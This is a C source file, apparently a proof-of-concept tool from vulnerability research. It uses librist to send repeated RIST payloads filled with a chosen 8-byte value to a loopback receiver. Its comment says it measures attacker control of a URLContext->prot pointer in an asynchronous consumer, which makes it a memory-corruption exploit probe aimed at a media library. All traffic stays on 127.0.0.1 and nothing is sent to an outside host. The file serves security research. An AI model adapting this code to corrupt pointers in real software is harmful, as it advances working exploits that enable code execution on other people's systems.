/* W4 throwaway loopback-only librist sender: fills every payload byte with
 * the little-endian bytes of a chosen 8-byte value, repeated. Used to measure
 * attacker control of URLContext->prot at the async consumer's next dispatch.
 * All traffic stays on 127.0.0.1. */
#include <librist/librist.h>
#include <librist/logging.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static int logcb(void *arg, enum rist_log_level lvl, const char *msg)
{
    (void)arg; (void)lvl;
    fprintf(stderr, "[librist] %s\n", msg);
    return 0;
}

int main(int argc, char **argv)
{
    const char *url = argc > 1 ? argv[1] : "rist://127.0.0.1:5004";
    int count = argc > 2 ? atoi(argv[2]) : 2200;
    size_t len = argc > 3 ? (size_t)strtoull(argv[3], NULL, 10) : 9968;
    unsigned long long target = argc > 4 ? strtoull(argv[4], NULL, 0) : 0x5a5a5a5a5a5a5a5aULL;

    struct rist_logging_settings ls = LOGGING_SETTINGS_INITIALIZER;
    struct rist_logging_settings *lsp = &ls;
    if (rist_logging_set(&lsp, RIST_LOG_INFO, logcb, NULL, NULL, NULL) < 0)
        return 1;

    struct rist_ctx *ctx = NULL;
    if (rist_sender_create(&ctx, RIST_PROFILE_MAIN, 0, lsp) < 0)
        return 1;

    struct rist_peer_config cfg;
    memset(&cfg, 0, sizeof(cfg));
    rist_peer_config_defaults_set(&cfg);
    struct rist_peer_config *pc = &cfg;
    if (rist_parse_address2(url, &pc) < 0)
        return 1;

    struct rist_peer *peer = NULL;
    if (rist_peer_create(ctx, &peer, pc) < 0)
        return 1;
    if (rist_start(ctx) < 0)
        return 1;
    usleep(600000);

    unsigned char *buf = malloc(len);
    if (!buf) return 1;
    for (size_t i = 0; i < len; i++)
        buf[i] = (unsigned char)(target >> (8 * (i & 7)));

    struct rist_data_block db;
    memset(&db, 0, sizeof(db));
    db.payload = buf;
    db.payload_len = len;
    int fails = 0;
    for (int i = 0; i < count; i++) {
        if (rist_sender_data_write(ctx, &db) < 0) fails++;
        usleep(3000);
    }
    fprintf(stderr, "sent %d blocks of %zu bytes target=0x%llx, %d failures\n",
            count, len, target, fails);
    usleep(600000);
    rist_destroy(ctx);
    free(buf);
    return 0;
}
